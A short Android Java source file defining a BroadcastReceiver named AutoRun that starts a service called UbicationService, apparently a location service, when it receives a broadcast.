package android.ubication;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class AutoRun extends BroadcastReceiver{

	@Override
	public void onReceive(Context context, Intent intent) {
		Intent s = new Intent(context, UbicationService.class);
		context.startService(s);
	}
}